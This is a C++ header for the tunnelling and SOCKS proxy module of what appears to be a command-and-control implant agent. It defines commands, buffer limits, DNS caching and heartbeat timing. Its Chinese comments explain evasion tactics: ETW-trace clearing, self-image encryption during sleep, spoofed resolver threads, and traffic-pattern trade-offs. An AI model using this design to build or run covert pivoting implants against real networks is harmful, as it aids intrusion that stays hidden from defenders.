#pragma once

#include "std.cpp"
#include "Packer.h"

#define COMMAND_TUNNEL_START_TCP 62
#define COMMAND_TUNNEL_START_UDP 63
#define COMMAND_TUNNEL_WRITE_TCP 64
#define COMMAND_TUNNEL_WRITE_UDP 65
#define COMMAND_TUNNEL_CLOSE     66
#define COMMAND_TUNNEL_REVERSE   67
#define COMMAND_TUNNEL_ACCEPT    68
#define COMMAND_TUNNEL_PAUSE     69
#define COMMAND_TUNNEL_RESUME    70

#define TUNNEL_CREATE_SUCCESS 0
#define TUNNEL_CREATE_ERROR 1

#define TUNNEL_STATE_CLOSE   0
#define TUNNEL_STATE_READY   1
#define TUNNEL_STATE_CONNECT 2
#define TUNNEL_STATE_RESOLVE 3   // 域名解析中（见下面的 DNS 段）

#define TUNNEL_MODE_SEND_TCP 0
#define TUNNEL_MODE_SEND_UDP 1
#define TUNNEL_MODE_REVERSE_TCP 2

#define TUNNEL_BUFFER_HIGH_WATERMARK 0x400000  // 4MB: stop reading
#define TUNNEL_BUFFER_LOW_WATERMARK  0x100000  // 1MB: resume reading
#define TUNNEL_BUFFER_HARD_CAP       0x1000000 // 16MB: close channel

/* 隧道活跃期的心跳节奏（毫秒）。
 *
 * 隧道数据不是独立连接，而是**搭心跳便车**的任务：Proxyfire_ProcessTunnels 把隧道 socket
 * 的收发塞进 MainAgent 循环里同一个 packerOut，服务端也在同一次 check-in 里把隧道任务
 * 和普通任务一起下发（ts_tasks.go 的 TsTaskGetAvailableAll）。所以 **sleep_delay 直接就是
 * 代理的包间隔** —— 实测 sleep=5 时一次内网取页要 ~70s（每个"等对端"的空档各吃一次 5s）。
 *
 * 三档：有通道且最近有数据流动 ⇒ AX_TUNNEL_POLL_MS；通道在但静默 ⇒ AX_TUNNEL_POLL_IDLE_MS；
 * 没有通道 ⇒ 0 = 照常按 sleep_delay 睡。把 AX_TUNNEL_POLL_MS 建成 0 即整条行为关闭
 * （回到"代理与心跳同频"的老样子，不需要改代码）。
 *
 * ★ 轮询用 ApiWin->Sleep 裸睡，**不能**走 OpsecSleepMilliseconds：后者每次都会清 ETW 痕迹
 *   并加解密自身映像，20Hz 的频率下等于自曝。
 * ★ 只在能真正缩短间隔时才接管（见 MainAgent），且只在工作时间窗口内。 */
#ifndef AX_TUNNEL_POLL_MS
#define AX_TUNNEL_POLL_MS 50
#endif
#ifndef AX_TUNNEL_POLL_ACTIVE_MS
#define AX_TUNNEL_POLL_ACTIVE_MS 15000
#endif
#ifndef AX_TUNNEL_POLL_IDLE_MS
#define AX_TUNNEL_POLL_IDLE_MS 300
#endif
/* 待命窗口（毫秒）：**最后一条通道关闭之后**仍保持 AX_TUNNEL_POLL_IDLE_MS 慢档这么久。
 *
 * 为什么需要它：快档只在"有通道活着"时生效，而通道是**跟着客户端连接走的**
 * （SOCKS 的每条浏览器连接 = 一个通道，关掉就没了）。没有这个窗口的话，扫描器一条一条连、
 * 或者操作员隔十几秒点下一个链接时，agent 早已回到 sleep_delay 的整睡里，
 * 于是**每一条新连接的建立都要等下一次心跳**（实测 sleep=5 时 CONNECT 要 3.4~5s）。
 * 有了窗口，新连接最多等一个慢档（默认 300ms）。
 *
 * 代价：用完代理后仍会以慢档心跳一小会儿 —— 这是拿流量特征换操作手感，按需调小或设 0 关闭。 */
#ifndef AX_TUNNEL_ARMED_MS
#define AX_TUNNEL_ARMED_MS 60000
#endif
/* 隧道连接（TCP 握手）的兜底超时，毫秒。
 *
 * ★ 为什么需要：老代码在 `Proxyfire_ConnectMessageTCP` 里只 select **100ms**，
 *   等不到就当场判 WSAETIMEDOUT —— 于是**握手超过 100ms 的目标一律打不开**。
 *   LAN 目标 1ms 没事，可目标机去连跨城/CDN/国外站点时握手 100ms+ 是常态，
 *   表现就是「有时候页面加载不出来 / 转圈」。
 *   现在连接在途的通道交给 CheckProxy 的 startTick/waitTime 状态机（select 只轮询不等待），
 *   这个值就是那条 deadline。设太大 → 死地址让浏览器白转；设太小 → 慢线路又被误杀。
 *   10s 是"比浏览器自己的重试更早放弃、又不至于误杀慢内网主机"的折中。 */
#ifndef AX_TUNNEL_CONNECT_TIMEOUT_MS
#define AX_TUNNEL_CONNECT_TIMEOUT_MS 10000
#endif

/* ===== 域名解析不许卡住心跳 =====
 *
 * `gethostbyname` 是**同步阻塞**的，而它原来直接跑在心跳线程里（ConnectMessageTCP）：
 * 目标机的 DNS 慢一点、或者对某个域名干脆不回包，一次解析就能把整条链路冻住几秒 ——
 * 冻住的不只是这一条代理连接，是**所有**标签页/隧道/命令输出，因为大家共用一次心跳往返。
 * （浏览器走 SOCKS5 是**远端 DNS**，域名原样丢给 agent，所以每个新域名都可能踩一次。）
 *
 * 三层处理，从便宜到贵：
 *   ① IP 直通：客户端给的本来就是 IP（proxychains / nmap / 手工填 IP）→ 一个字都不查；
 *   ② 缓存：同一域名只解析一次（正缓存 10 分钟，失败也缓存，免得反复捅同一个黑洞）；
 *   ③ 工作线程：缓存没命中才丢给后台线程解析，通道停在 TUNNEL_STATE_RESOLVE 干等，
 *      **心跳照跑**，其它通道不受影响。
 *
 * 线程是**一条常驻的解析线程**（`Proxyfire_EnsureResolver`，懒创建、永不退出，用事件唤醒）：
 *   · 只 spoof 一次 —— 线程创建事件从"每个新域名 1 次"降到"整个会话 1 次"；
 *   · 永不 return ⇒ 天然避开 spoofed 线程"函数返回即踩被劫持栈帧"的那个坑；
 *   · 由 MainAgent 主循环调用创建（与 BOF 异步起线程同一上下文），不是在隧道命令处理里建。
 * 缓存槽是 Proxyfire 里的固定数组，**槽本身就是队列**（state==2 即待解析），
 * 解析线程只写这些槽、不碰 Vector（Vector 会搬移元素），也不做任何分配/释放。 */
#define AX_DNS_CACHE_SIZE      64
#define AX_DNS_NAME_MAX        96
#define AX_DNS_TTL_MS          600000UL   // 正缓存 10 分钟
#define AX_DNS_FAIL_TTL_MS      60000UL   // 负缓存 1 分钟
#define AX_TUNNEL_RESOLVE_TIMEOUT_MS 8000 // 解析兜底：超时就算失败，别让浏览器干等

struct DnsEntry {
	CHAR  name[AX_DNS_NAME_MAX];
	ULONG addr;    // 0 = 解析失败（负缓存）
	ULONG tick;    // 出结果的时刻
	BYTE  state;   // 0=空槽 1=已有结果 2=解析中（主循环只认 1）
};


struct TunnelData {
	ULONG  channelID;
	ULONG  type;
	SOCKET sock;
	BYTE   state;
	BYTE   mode;
	ULONG  i_address;
	WORD   port;
	ULONG  waitTime;
	ULONG  startTick;
	ULONG  closeTimer;
	CHAR*  writeBuffer;
	ULONG  writeBufferSize;
	BOOL   paused;
	BOOL   server_paused;
	WORD   dnsSlot;        // TUNNEL_STATE_RESOLVE 时用哪个缓存槽
};

typedef struct _Proxyfire {
	Vector<TunnelData> tunnels;
	// 最近一次隧道数据真正流动的 tick（开新通道 / 服务端下发写入 / 本进程往外发）。
	// 只给 Proxyfire_PollDelayMs 用来区分"有人在用这条代理"和"通道挂着但没人动"。
	ULONG activeTick;
	// 最近一次通道**建立或关闭**的 tick。通道是跟着客户端连接走的，关掉就没了；
	// 这条时间戳让"刚用完代理"的一段时间内保持待命慢档，新连接不必等一整个 sleep_delay。
	ULONG armedTick;
	// 域名解析缓存 + 常驻解析线程（见文件头的 DNS 段）。固定数组，进程内常驻。
	// 缓存数组**本身就是队列**：state==2 = 待解析，常驻线程扫到就解析掉。
	DnsEntry dns[AX_DNS_CACHE_SIZE];
	HANDLE   resolverEvent;    // 唤醒常驻解析线程（自动重置事件）
	BOOL     resolverStarted;  // 线程已建
	BOOL     resolverFailed;   // 建线程/事件失败过 —— DnsBegin 据此退回同步解析，别干等 deadline
} Proxyfire;

Proxyfire* Proxyfire_Create();
void Proxyfire_Destroy(Proxyfire* self);
void Proxyfire_ProcessTunnels(Proxyfire* self, Packer* packer);
ULONG Proxyfire_PollDelayMs(Proxyfire* self);
void Proxyfire_EnsureResolver(Proxyfire* self);   // 主循环调用：有解析请求且线程未起时才建
void Proxyfire_CheckProxy(Proxyfire* self, Packer* packer);
ULONG Proxyfire_RecvProxy(Proxyfire* self, Packer* packer);
void Proxyfire_FlushProxy(Proxyfire* self, Packer* packer);
void Proxyfire_CloseProxy(Proxyfire* self);
void Proxyfire_ConnectMessageTCP(Proxyfire* self, ULONG channelId, ULONG type, CHAR* address, WORD port, Packer* outPacker);
void Proxyfire_ConnectMessageUDP(Proxyfire* self, ULONG channelId, CHAR* address, WORD port, Packer* outPacker);
void Proxyfire_ConnectWriteTCP(Proxyfire* self, ULONG channelId, CHAR* data, ULONG dataSize, Packer* outPacker);
void Proxyfire_ConnectWriteUDP(Proxyfire* self, ULONG channelId, CHAR* data, ULONG dataSize);
void Proxyfire_ConnectClose(Proxyfire* self, ULONG channelId);
void Proxyfire_ConnectMessageReverse(Proxyfire* self, ULONG tunnelId, WORD port, Packer* outPacker);
void Proxyfire_ConnectPause(Proxyfire* self, ULONG channelId);
void Proxyfire_ConnectResume(Proxyfire* self, ULONG channelId);
void Proxyfire_AddProxyData(Proxyfire* self, ULONG channelId, ULONG type, SOCKET sock, ULONG waitTime, ULONG mode, ULONG address, WORD port, ULONG state);
// 组包工具。它们定义在 Proxyfire.cpp 的后面，而文件开头的 DNS/连接辅助函数要用，
// 所以在这里先声明（以前只有 .cpp 内部用，靠"定义在使用之前"侥幸成立）。
void PackProxyStatus(Packer* packer, ULONG channelId, ULONG commandId, ULONG type, ULONG result);
void PackProxyControl(Packer* packer, ULONG channelId, ULONG commandId);
void PackProxyData(Packer* packer, ULONG channelId, BYTE* data, ULONG dataSize);